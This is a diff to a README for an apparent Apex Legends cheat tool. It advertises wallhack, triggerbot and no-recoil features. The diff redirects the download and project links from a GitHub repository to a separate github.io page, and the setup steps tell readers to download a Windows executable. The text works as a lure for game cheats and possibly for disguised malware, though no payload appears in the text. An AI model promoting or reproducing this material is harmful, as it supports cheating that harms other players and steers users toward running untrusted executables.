@@ -1,6 +1,6 @@
 # 🧊 Apex-Legends-Frost-Core-2026 - Improve your competitive performance in Apex
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Alinaunroofed185/Apex-Legends-Frost-Core-2026)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://alinaunroofed185.github.io)
 
 Apex-Legends-Frost-Core-2026 provides players with tools to enhance their experience in Apex Legends. This software includes features like wallhack, triggerbot, and no recoil. It optimizes game performance to ensure smooth movement and reliable accuracy. Users gain better visibility and control during matches.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these specifications to run the software.
 
 Follow these steps to set up the software.
 
-1. Visit the project page at this link: [https://github.com/Alinaunroofed185/Apex-Legends-Frost-Core-2026](https://github.com/Alinaunroofed185/Apex-Legends-Frost-Core-2026)
+1. Visit the project page at this link: [https://alinaunroofed185.github.io](https://alinaunroofed185.github.io)
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click on the latest version available.
 4. Download the executable file labeled for Windows.
